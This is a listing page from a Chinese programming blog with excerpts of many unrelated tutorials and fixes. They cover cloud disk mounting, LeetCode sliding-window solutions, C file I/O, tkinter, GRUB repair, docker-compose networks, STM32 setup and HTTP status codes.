			<a href="/posts/7357d0f4168553aa1e585e4ded345298/" rel="bookmark">
			阿里云磁盘挂载，挂载点提示异常：mount: /data: wrong fs type, bad option, bad superblock on /dev/vdb, missing codepag
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.首先创建一个挂载点：mkdir /data
2.然后mount命令挂载设备：mount /dev/vdb /data
2.1报错信息：
mount: /data: wrong fs type, bad option, bad superblock on /dev/vdb, missing codepage or helper program, or other error.
分析
系统提示中有说到是文件系统的问题，然后就翻阅阿里云文档：https://cloud.tencent.com/document/product/362/6734#Linux，发现少了一步设置文件系统的步骤。那么操作步骤应该是：
1.创建设备挂载点
mkdir /data
2.设置文件系统
mkfs -t ext4 /dev/vdb
3.挂载操作
mount /dev/vdb /data
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ffb98121b0b36a04417cb4d21c486dc/" rel="bookmark">
			力扣 1004. 最大连续1的个数 III
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、 题目 二、 示例 三、思路与代码 1. 思路： 本题采用滑动窗口算法；（可以对比 力扣3 无重复字符的最长子串）关键：本题说可以翻转0为1 k次， 来找最长的连续1的子串， 即可以换种思路：该连续1子串中包括0的个数， 不可以超过k；同样套用滑动窗口算法模板：注意几个关键处理点 right 指针往右移动扩大窗口；而当窗口中0的个数超过 k 时， 进行窗口的收缩， 不断移动left指针， 直到窗口中 0 的个数不超过k；而当包含连续1子串（即 “窗口”）中的0个数不超过k的时候， 进行子串长度的更新； 2. 代码如下： 代码中包含详细的注释； class Solution { public: int longestOnes(vector&lt;int&gt;&amp; nums, int k) { // 滑动窗口 0 1 个数的记录 unordered_map&lt;int, int&gt; windows;	// 窗口中0 1 计数器 int left = 0;	// left 指针 int right = 0;	// right 指针 int cnt = 0;	// 连续 1 子串的长度 int n_len = nums.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2ffb98121b0b36a04417cb4d21c486dc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c0a76fdb84d61ea4030e1d3c9242770d/" rel="bookmark">
			力扣 3. 无重复字符的最长子串
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、 题目 二、 示例 三、 思路与代码 1. 思路： 1. 采用滑动窗口算法； 2. 滑动窗口收缩的关键： - 当当前移入窗口的字符其计数已经超过1时，则进行窗口的收缩； 3. 无重复子串长度更新的时机：当窗口中没有重复字符时， 更新长度； 4. 具体见代码解析； 2. 代码： class Solution { public: int lengthOfLongestSubstring(string s) { const int INT_MIN_LEN = 0; // 滑动窗口解法 unordered_map&lt;char, int&gt; windows; int left = 0; int right = 0; int s_len = s.size(); int ans_len = INT_MIN_LEN; while (right &lt; s_len) { char c = s[right]; right++; windows[c]++; // 当窗口中有重复的字符时， 进行收缩, 其他的时候， 可以更新数据长度 while (windows[c] &gt; 1) { char d = s[left]; left++; windows[d]--; } ans_len = max(right - left, ans_len); } return ans_len; } }; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f80d20e49a5fbe3cafa312463585b8db/" rel="bookmark">
			C语言文件管理操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C语言文件管理操作 一、为什么使用文件二、什么是文件2.1程序文件2.2数据文件（本章的主要讨论对象）2.3文件名 三、文件的打开和关闭3.1文件指针3.2文件的打开和关闭 四、文件的顺序读写4.1fputc4.2fgetc4.3fputs4.4fgets4.5fprintf4.6fscanf4.7fwrite4.8fread4.9sprintf4.10sscanf 五、文件的随机读写5.1fseek5.2ftell5.3rewind 六、文本文件和二进制文件七、文件读取结束的判定八、文件缓冲区 一、为什么使用文件 我们前面学习结构体时，写了通讯录的程序，当通讯录运行起来的时候，可以给通讯录中增加、删除数据，此时数据是存放在内存中，当程序退出的时候，通讯录中的数据自然就不存在了，等下次运行通讯录程序的时候，数据又得重新录入，如果使用这样的通讯录就很难受。我们在想既然是通讯录就应该把信息记录下来，只有我们自己选择删除数据的时候，数据才不复存在。这就涉及到了数据持久化的问题，我们一般数据持久化的方法有，把数据存放在磁盘文件、存放到数据库等方式。使用文件我们可以将数据直接存放在电脑的硬盘上，做到了数据的持久化。
二、什么是文件 一般谈的文件有两种：程序文件、数据文件（从文件功能的角度来分类的）。
2.1程序文件 包括源程序文件（后缀为.c）,目标文件（windows环境后缀为.obj）,可执行程序（windows环境后缀为.exe）。
2.2数据文件（本章的主要讨论对象） 文件的内容不一定是程序。而是程序运行时读写的数据，比如程序运行需要从中读取数据的文件，或者输出内容的文件。
在此之前我们所处理数据输入输出都是以终端为对象的，即从终端的键盘输入数据，运行结果显示到显示器上。
其实有时候我们会把信息输出到磁盘上，当需要的时候再从磁盘上把数据读取到内存中使用，这里处理的就是磁盘上文件。
2.3文件名 一个文件要有一个唯一的文件标识，以便用户识别和引用。
文件名包含3部分：文件路径+文件名主干+文件后缀
例如： c:\code\test.txt
为了方便起见，文件标识常被称为文件名。
三、文件的打开和关闭 3.1文件指针 缓冲文件系统中，关键的概念是“文件类型指针”，简称“文件指针”。
每个被使用的文件都在内存中开辟了一个相应的文件信息区，用来存放文件的相关信息（如文件的名字，文件状态及当前的位置等）。这些信息是保存在一个结构体变量中。该结构体类型是由系统声明的，取名FILE.
例如，VS2013编译环境提供的 stdio.h 头文件中有以下的文件类型申明：
struct _iobuf { char *_ptr; int _cnt; char *_base; int _flag; int _file; int _charbuf; int _bufsiz; char *_tmpfname; }; typedef struct _iobuf FILE; 不同的C编译器的FILE类型包含的内容不完全相同，但是大同小异。
每当打开一个文件的时候，系统会根据文件的情况自动创建一个FILE结构的变量，并填充其中的信息，使用者不必关注细节。
一般都是通过一个FILE的指针来维护这个FILE结构的变量，这样使用起来更加方便。
下面我们可以创建一个FILE*的指针变量：
FILE* pf 定义pf是一个指向FILE类型数据的指针变量。可以使pf指向某个文件的文件信息区（是一个结构体变量）。通过该文件信息区中的信息就能够访问该文件。也就是说，通过文件指针变量就能够找到与它关联的文件。
比如;
3.2文件的打开和关闭 文件在读写之前应该先打开文件，在使用结束之后应该关闭文件。
在编写程序的时候，在打开文件的同时，都会返回一个FILE*的指针变量指向该文件，也相当于建立了指针和文件的关系。
ANSIC 规定使用fopen函数来打开文件，fclose来关闭文件。
//打开文件 FILE * fopen ( const char * filename, const char * mode ); //关闭文件 int fclose ( FILE * stream ); 打开方式如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f80d20e49a5fbe3cafa312463585b8db/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e1d4fc7738e326fb6fdd41bb7dbabd51/" rel="bookmark">
			语音信号处理 | 傅里叶变换、短时傅里叶变换、小波变换、希尔伯特变换、希尔伯特黄变换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在信号处理领域，存在诸多变换，比如标题中的五个变换。本文将对这五个变换进行介绍和比较。在开始之前，我们需要先理清什么是平稳信号，什么是非平稳信号。
我们知道，自然界中几乎所有信号都是非平稳信号，比如我们的语音信号就是典型的非平稳信号。那么何谓平稳信号和非平稳信号呢？一个通俗的理解即，平稳信号在不同时间得到的采样值的统计特性(比如期望、方差等)是相同的，非平稳信号则与之相反，其特性会随时间变化。在信号处理中，这个特性通常指频率。
通常傅里叶变换只适合处理平稳信号，对于非平稳信号，由于频率特性会随时间变化，为了捕获这一时变特性，我们需要对信号进行时频分析，就包括短时傅里叶变换、小波变换、希尔伯特变换、希尔伯特黄变换这几种变换。以下逐一进行分析介绍。
傅里叶变换(Fourier Transform, FT) 首先考虑一个连续信号 f ( t ) f(t) f(t)的傅里叶变换和它的反变换，如下
F ( ω ) = F [ f ( t ) ] = ∫ − ∞ + ∞ f ( t ) e − j ω t d t F(\omega)=F[f(t)]=\int_{-\infty}^{+\infty}f(t)e^{-j\omega t}dt F(ω)=F[f(t)]=∫−∞+∞​f(t)e−jωtdt
f ( t ) = F − 1 [ F ( ω ) ] = 1 2 π ∫ − ∞ + ∞ F ( ω ) e j ω t d ω f(t)=F^{-1}[F(\omega)]=\frac{1}{2\pi}\int_{-\infty}^{+\infty}F(\omega)e^{j\omega t}d\omega f(t)=F−1[F(ω)]=2π1​∫−∞+∞​F(ω)ejωtdω
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e1d4fc7738e326fb6fdd41bb7dbabd51/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/838a5997d2df7b85c338e26b133a43d5/" rel="bookmark">
			Status Code:307 Internal Redirect和Non-Authoritative-Reason:HSTS问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近在手机上点击网站百度收录的链接时，出现了一个奇怪的问题，点击每一个链接，都跳转到一个固定的页面，百思不得解，打开浏览器控制台发现了一个奇怪的错误码307，
百度搜了一下，说了一堆解决方法，总结起来就是，域名在https和http切换的过程中出现了问题，我把http的请求改成https之后，问题就顺利解决了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ec15ddf1c06ab3c50ec215aefd071ead/" rel="bookmark">
			还是只有npm install vite好使，其他的都不行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MacBook-Pro daily-cost-h5-05 % MacBook-Pro daily-cost-h5-05 % npm run dev &gt; daily-cost@0.0.0 dev &gt; vite sh: vite: command not found MacBook-Pro daily-cost-h5-05 % npm install vite2 npm ERR! code E404 npm ERR! 404 Not Found - GET https://registry.npm.taobao.org/vite2 npm ERR! 404 npm ERR! 404 'vite2@*' is not in the npm registry. npm ERR! 404 You should bug the author to publish it (or use the name yourself!) npm ERR! 404 npm ERR!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ec15ddf1c06ab3c50ec215aefd071ead/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0c064654c91bcb14cfc6684a52336dce/" rel="bookmark">
			电脑设置开机自启动某个软件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、同时按下【win】+【R】键
2、输入shell:startup并回车
3、打开文件夹后，将需要设置为开机启动的软件快捷方式复制粘贴到启动项文件夹
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/89fcdce9f9a87c0372d4a9d9f2906d3b/" rel="bookmark">
			python之tkinter控件详解(1)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		不好意思，前两天有点忙，没顾上写文章，大家多多包涵
目录： ⒈前言⒉文本固定位置⒊单行文本输入框⒋按钮·(1)创建按钮·(2)美化①修改字的颜色②修改背景颜色③修改边框宽度④修改字体及大小 附件1📎附件2📎 ⒈前言 接上篇，这次我会讲一些基础的控件，需要多动手操作。后续还会有这些控件的拓展
如果不知道tkinter是什么，可以去看看我上一篇文章，上一篇解释了tkinter是什么和有什么功能，需要掌握
下面是上一篇文章的链接
https://blog.csdn.net/2301_76201641/article/details/128701739
⒉文本固定位置 有时候我们不想让文本居中显示，这时就需要用到place指令
我们直接把f.pack()改成f.place(x= ,y= )。x和y是坐标的数值
要以左上角点的坐标为准，例如(0,0)
这里要注意，如果有了解过scratch的人都知道，scratch里中心点的坐标是0,0
但是python里画布左上角是0,0
在写place时里面要写x=……和y=……
⒊单行文本输入框 tkinter可以像表单一样让用户输入数据并提交数据
我们来完成第一步 单行文本输入框
下面是文本输入框的代码：
a= tk.Entry(win, width=15, bd=2) a.pack() 下面，我们一一解释：
a是一个变量，不用多说了吧
Entry是单行文本输入框的控件命令
width是输入框宽度（详见下图）
bd表示输入框边框的宽度，范围是0～5（不好表示，有问题私信我）
pack是把他显示到中间
运行演示
⒋按钮 用户在填写问卷后会进行上传，tkinter也可以实现这个功能
·(1)创建按钮 a_button = tk.Button(win, text="提交") a_button.pack() 解释一下：
a_button是一个变量，可以换为别的名
“tk.Button”是tkinter里的Button模块，这里不能修改
“win”我就不用解释了，有问题的私信我
“text”是按钮里显示的字，可以修改
运行演示：
·(2)美化 ①修改字的颜色 想要改变字的颜色，和文本一样，使用fg参数
a_button = tk.Button(win, text="提交",fg='blue') a_button.pack() 运行演示：
②修改背景颜色 改变背景颜色和文本框一样，使用bg参数
a_button = tk.Button(win, text="提交",fg='blue',bg='yellow') a_button.pack() 运行演示
③修改边框宽度 和修改输入框的边框宽度一样使用bd参数
a_button = tk.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/89fcdce9f9a87c0372d4a9d9f2906d3b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/71d9af381adf79dc68b62dc032b1dfcc/" rel="bookmark">
			Python星座查询
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 目录： 代码 代码 代码如下：
while True: d = input('请输入出生日期:') if d.isdigit(): print('出生日期:', d) break else: print('输入的日期有误') d = int(d) for i in info: t = info[i].split('-') t1 = int(t[0]) t2 = int(t[1]) if d &gt;= t1 and d &lt;= t2: print('你的星座是:', i) break if d &gt;= 1222 and d &lt;= 1231: print('你的星座是:摩羯座') break #因为不支持0开头的数字所以使用了这种方法 if d &gt;=int('0101') and d &lt;=int('0119'): print('你的星座是:摩羯座') break 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb819d9da7deb472b1129657a4d2e44f/" rel="bookmark">
			Python黑客帝国代码雨
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 准备代码 准备 需要安装pygame
安装代码：
pip install pygame 代码 代码如下：
import random import pygame #我的电脑分辨率是这个数值，做到全屏显示 width = 1366 highly = 768 FONT_PX = 15#每列宽度 pygame.init() winSur = pygame.display.set_mode((width, highly)) font = pygame.font.SysFont("123.ttf", 25) bg_suface = pygame.Surface((width,highly), flags=pygame.SRCALPHA) pygame.Surface.convert(bg_suface) bg_suface.fill(pygame.Color(0, 0, 0, 28)) winSur.fill((0, 0, 0)) # 字母版 letter = ['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm'] l=['1','0']#二进制 texts = [ font.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fb819d9da7deb472b1129657a4d2e44f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d16db4c9fe608c6b99f9a918cd67228f/" rel="bookmark">
			[软件工具][windows]yolo格式数据自动检查工具检查出错误yolo数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先我们打开软件，界面如下：
我们选择yolo格式txt所在目录即可，然后点击开始检查按钮即可，检查可以检查出如下错误：
（1）txt格式错误
（2）txt是个空文件
（3）txt中x归一化错误
(4)txt中y归一化错误
(5)txt中w归一化错误
(6)txt中h归一化错误 如果发现错误，我们可以对着错误列表右键单击选择删除，这样文件就会放到回收站里面。
具体视频教程参考：
yolo格式自动检查标注错误检查工具使用教程_哔哩哔哩_bilibili
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0c162e792703c191b08e3121d760f185/" rel="bookmark">
			【OpenJudge NOI】题解目录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【OpenJudge NOI】题解目录 OJ链接：OpenJudge NOI
以下为本人做的OJ题解
针对每一道题我都会给出题目考点、解题思路、题解代码。必要时也会给出不同的解题方法。
如有不足之处，欢迎大家评论指正。如看过后还有不明白的地方，或有更好的解题方法，欢迎大家在评论区留言讨论。
作者：君义_noip
1.1 编程基础之输入输 1 Hello, World!：点击这里
2 输出第二个整数：点击这里
3 对齐输出：点击这里
4 输出保留3位小数的浮点数：点击这里
5 输出保留12位小数的浮点数：点击这里
6 空格分隔输出：点击这里
7 输出浮点数：点击这里
8 字符三角形：点击这里
9 字符菱形：点击这里
10 超级玛丽游戏：点击这里
1.2 编程基础之变量定义、赋值及转换 1 整型数据类型存储空间大小：点击这里
2 浮点型数据类型存储空间大小：点击这里
3 其他基本数据类型存储空间大小：点击这里
4 填空：类型转换1：点击这里
5 填空：类型转换2：点击这里
6 浮点数向零舍入：点击这里
7 打印ASCII码：点击这里
8 打印字符：点击这里
9 整型与布尔型的转换：点击这里
10 Hello, World!的大小：点击这里
1.3 编程基础之算术表达式与顺序执行 1 A+B问题：点击这里
2 计算(a+b)*c的值：点击这里
3 计算(a+b)/c的值：点击这里
4 带余除法：点击这里
5 计算分数的浮点数值：点击这里
6 甲流疫情死亡率：点击这里
7 计算多项式的值：点击这里
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0c162e792703c191b08e3121d760f185/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f56e26d7b60b3fc768f2a317ab7a477a/" rel="bookmark">
			linux文件代理高速下载,告别龟速下载!
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 原始下载链接:
wget https://github.com/SwinTransformer/storage/releases/download/v1.0.0/swin_tiny_patch4_window7_224.pth
高速下载: wget https://ghproxy.com/https://github.com/SwinTransformer/storage/releases/download/v1.0.0/swin_tiny_patch4_window7_224.pth
只需要在前面加上镜像代理地址, 速度达到1MB/s以上
--2023-01-28 21:57:58-- https://ghproxy.com/https://github.com/SwinTransformer/storage/releases/download/v1.0.0/swin_tiny_patch4_window7_224.pth Resolving ghproxy.com (ghproxy.com)... 129.146.41.82 Connecting to ghproxy.com (ghproxy.com)|129.146.41.82|:443... connected. HTTP request sent, awaiting response... 200 OK Length: 114342173 (109M) [application/octet-stream] Saving to: ‘swin_tiny_patch4_window7_224.pth.1’ swin_tiny_patch4_window7 100%[==================================&gt;] 109.04M 1.52MB/s in 59s 2023-01-28 21:58:58 (1.85 MB/s) - ‘swin_tiny_patch4_window7_224.pth.1’ saved [114342173/114342173] 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/19803279bd2c690f76a83998e47522f2/" rel="bookmark">
			批处理中的变量详解(4)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		批处理的变量详解 分类系统变量自定义变量 分类 批处理中变量分为两种:自定义变量和系统变量 系统变量 介绍: 系统变量是由系统将其根据事先定义的条件自动赋值,也就是这些变量系统已经给他们定义了值, 不要要我们给它们赋值,我们只需要调用即可 列举一些常见的系统变量: %CD% - 扩展到当前目录字符串 %DATE% - 用跟 DATE 命令同样的格式扩展到当前日期 %TIME% - 用跟 TIME 命令同样的格式扩展到当前时间 另外,还有一个系统变量,代表一个意思,分别为%0,%1...%9,还有一个%* 实例:
先进入脚本工作目录: cd scriptPath
输入脚本名后面跟参数值 scriptName parameter_1 [parameter_n]
脚本代码:
@echo off
rem 处理批处理参数
echo 第一个参数：%1
echo 第二个参数：%2
echo 第三个参数：%3
pause
结果：
备注: %*的作用是返回全部参数的值,不用在输入%1,%2…
自定义变量 介绍: 自定义变量就是由我们来给它们赋值的变量,要使用自定义变量就得使用set关键值 基本格式: SET [opetions] [variable=[string]] variable 指定环境变量名 string 指定要指派给变量的一系列字符串 opetions 可选参数,分别由"/p",''/a"两个可选参数 备注: 可选参数解析 1. SET /p [变量名=[键盘输入的值]] 2. SET /a [变量名=[可作数自增计算]] 实例:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/19803279bd2c690f76a83998e47522f2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7e1eac1a0bda97257347e98a63388e26/" rel="bookmark">
			解决OpenEuler系统 Minimal BASH-like line editing is supported
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2023年开工解决的第一个问题~
呃，起因是这样的，由于业务需要，修改内核参数后重新打包内核，然后安装内核rpm包后，强制关机，结果就出现如上界面。网上搜索后绝大部分是因为安装了双系统后找不到grub系统引导文件，但是我的问题是因为内核安装不正确还是因为强制断电导致还有待验证。解决办法无非就是重新生成grub配置文件。操作如下：
ls 查看分区（每个人的分区和每个人的分区显示可能不一样，但总体结构是不变）
ls (hd0，gpt1)/ 查看分区内容（每个分区内容都检查一下），找到存在vmlinuz文件和initramfs文件的分区，很明显我的vmlinuz文件和initramfs文件的分区在（hd0,gpt2)中。
重新手动设置跟分区,根据自己root挂载目录来设置root路径，我的root目录为lvm,则是/dev/openeuler/root(自己的lvm目录）
boot 重新启动，等待重新进入系统，此时是临时设置，并非持久生成grub配置文件，需进入系统重新生成grub文件
以欧拉22.03LTS为例：
生成的配置文件在：/boot/efi/EFI/openEuler/grub.cfg
执行 grub2-mkconfig -o /boot/efi/EFI/openEuler/grub.cfg 更新配置
最小安装没有 update-grub 命令
然后重启，检查系统是否可以进入引导。问题得以解决~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0cc030586e5208d9b27da95ace0dbc24/" rel="bookmark">
			vue3&#43;ts&#43;echarts 绘制一个射线中国地图&#43;轮播tooltip
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.效果图如下 2.代码如下(如果你懂Ts可直接用) &lt;template&gt; &lt;div ref="main" id="main" style="height: 100%; width: 100%; background: skyblue" &gt;&lt;/div&gt; &lt;/template&gt; &lt;script setup lang="ts"&gt; // 引入hook import { ref, reactive, onMounted } from 'vue' // 引入 echarts import * as echarts from 'echarts' import type { utilsParams, funcFace1 } from '@/utils/interface' import china from '../map/china.json' console.log(china.features[china.features.length - 1]) // 注册china map echarts.registerMap('china', require('../map/china.json') || china) // 定义一个ref const main = ref&lt;any&gt;(null) // tooltip random函数体 const randomfunc=():number=&gt; Math.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0cc030586e5208d9b27da95ace0dbc24/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/54bac99d3e3801b1520265af88fb05eb/" rel="bookmark">
			docker-compose加入已经存在的网络
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 查看已存在的网络 docker network ls 在需要加入同一局域网的容器 .yml或yaml文件中添加下面的代码：
networks: default: external: name: NetworkName 在高版本的compose中会提示：WARN[0000] network default: network.external.name is deprecated. Please set network.name with external: true
意思是上述方式已经弃用，应使用下述方式
networks: default: external: true name: mq-cluster-test 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f5b4622f79c8c6aabe0a444f7eefecd0/" rel="bookmark">
			STM32 第9讲 STM32CubeMX简介安装和简单使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 STM32CubeMX安装安装JAVA环境安装STM32CubeMX下载关联STM32Cube固件包 新建工程芯片选型配置时钟源时钟树配置GPIO引脚配置Debug选项配置生成工程编写逻辑代码 STM32CubeMX安装 STM32CubeMX是ST开发的一款图形配置工具，可以通过图形化配置自动生成初始化代码。
STM32的标准外设库已经停止维护了。
安装JAVA环境 安装STM32CubeMX之前必须安装JAVA环境，这两个顺序不能调换。
官网下载地址link
下载完成后，点击安装包，直接安装即可。
接下来检测是否安装成功。
Win + R 输入cmd打开指令窗口，键入java -version，显示当前java版本号则安装成功。
安装STM32CubeMX 官网下载地址link
安装注意事项：
建议不要安装在C盘安装路径不能有中文字符 双击安装包开始安装
即安装完成了
下载关联STM32Cube固件包 双击下载好的STM32CubeMX，在Help栏中找到Updater Settings，更改固件安装包的位置，避免装在系统盘。
点击Help栏中的管理固件包选项，对固件包进行管理。
选择需要的版本 Install 后会自动解压关联。
选择本地已经下载好的固件压缩包，关联成功后会显示绿色。
新建工程 芯片选型 选择自己所需要的芯片双击
配置时钟源 时钟树配置 ① 时钟源参数设置：我们选择 HSE 为时钟源，所以我们要根据硬件实际的高速晶振频率（这里我们是 8MHz）填写。
③ 时钟源选择：我们配置选择器选择 HSE 即可。
④ PLL1 分频系数 M 配置。分频系数 M 我们设置为 8。
④ PLL1 倍频系数 N 配置。倍频系数 N 我们设置为 336。
⑤ PLL1 分频系数 P 配置。分频系数 P 我们配置为 2。
⑥ 系统时钟时钟源选择：PLL,HSI 还是 HSE。我们选择 PLL，选择器选择 PLLCLK 即可。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f5b4622f79c8c6aabe0a444f7eefecd0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7c950b1ada88487b6d0087bcf1acf51e/" rel="bookmark">
			STM32 第11讲 正点原子SYSTEM文件夹介绍及使用（sys/delay/usart）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 sys文件夹delay文件夹函数简介Systick定时器工作原理寄存器函数介绍 usart文件夹printf函数输出流程printf函数的使用printf函数支持微库法代码法 SYSTEM 文件夹里面的代码由正点原子提供，STM32F4xx 系列的底层核心驱动函数，可以用在 STM32F4xx 系列的各个型号上面。SYSTEM 文件夹下包含了 delay、sys、usart 等三个文件夹。
sys文件夹 delay文件夹 函数简介 delay 文件夹内包含了 delay.c 和 delay.h 两个文件，包含7个函数。
void delay_osschedlock(void); void delay_osschedunlock(void); void delay_ostimedly(uint32_t ticks); void SysTick_Handler(void); void delay_init(uint16_t sysclk); void delay_us(uint32_t nus); void delay_ms(uint16_t nms); 前面 4 个函数，仅在支持操作系统（OS）的时候，需要用到，而后面 3 个函数，则不论是否支持 OS 都需要用到
Systick定时器 工作原理 CM4 内核处理器，内部包含了一个 SysTick 定时器，SysTick 是一个 24 位的向下递减的计数定时器，当计数值减到 0 时，将从 RELOAD 寄存器中自动重装载定时初值，开始新一轮计数。只要不把它在 SysTick 控制及状态寄存器中的使能位清除，就永不停息。
从上一讲的时钟树可以知道F4系列Systick的时钟源为HCLK即AHB总线上
重装载指范围0~16777215
寄存器 CTRL(控制及状态寄存器)
在ST公司产品中CLKSOURCE位被设置的功能是设置分频系数LOAD（重装载数值寄存器）
VAL(当前数值寄存器)
函数介绍 delay_init()函数 /** * @brief 初始化延迟函数 * @param sysclk: 系统时钟频率, 即 CPU 频率(rcc_c_ck), 168MHz * @retval 无 */ void delay_init(uint16_t sysclk) { #if SYS_SUPPORT_OS /* 如果需要支持 OS */ uint32_t reload; #endif /* SYSTICK 使用外部时钟源,频率为 HCLK */ HAL_SYSTICK_CLKSourceConfig(SYSTICK_CLKSOURCE_HCLK); g_fac_us = sysclk; /* 不论是否使用 OS,g_fac_us 都需要使用 */ #if SYS_SUPPORT_OS /* 如果需要支持 OS.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7c950b1ada88487b6d0087bcf1acf51e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/faeb35b8b60fba1d31260cb03fd12e90/" rel="bookmark">
			[多媒体] 关于H264的 profile 和 level
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		H264作为一个“指定标准”的文档 会涉及到对画面质量和某些参数的一些规格划分。这样才有助于多系统协同合作。
profile 是指对画面功能性的等级划分，编解码器可以选择按照H264的标准进行功能完善，也可以按照自己的意愿自定义profile，不过作为软件架构的一部分，采用H264标准就意味着要遵守标准的定义，所以也就是说如果某个编解码器对外宣称自己支持某个profile，那么其功能至少应该多于这个profile的H264定义。
level 是指对画面质量的等级划分，比如能够支持的最大码率，最大分辨率，等等。同profile一样，如果某个编解码器说支持level 4.1，那么他的能力至少应该在 4.1之上。
参考： H264概念解析-Profile - 追随技术 - 博客园
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b4fb6bf107e834164dfc2465a78a6d4b/" rel="bookmark">
			HTTP 响应行 成功类型响应码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		返回结果的 HTTP 状态码 HTTP 状态码负责表示客户端 HTTP 请求的返回结果、标记服务器端的处理是否正常、通知出现的错误等工作。让我们通过学习，好好了解一下状态码的工作机制。
状态码告知从服务器端返回的请求结果 状态码的职责是当客户端向服务器端发送请求时，描述返回的请求结果。借助状态码，用户可以知道服务器端是正常处理了请求，还是出现了错误。
图：响应的状态码可描述请求的处理结果
状态码如 200 OK，以 3 位数字和原因短语组成。
数字中的第一位指定了响应类别，后两位无分类。响应类别有以下 5 种。
表 4-1：状态码的类别 类别原因短语
1XXInformational（信息性状态码）接收的请求正在处理2XXSuccess（成功状态码）请求正常处理完毕3XXRedirection（重定向状态码）需要进行附加操作以完成请求 4XXClient Error（客户端错误状态码）服务器无法处理请求5XXServer Error（服务器错误状态码）服务器处理请求出错 只要遵守状态码类别的定义，即使改变 RFC2616 中定义的状态码，或服务器端自行创建状态码都没问题。
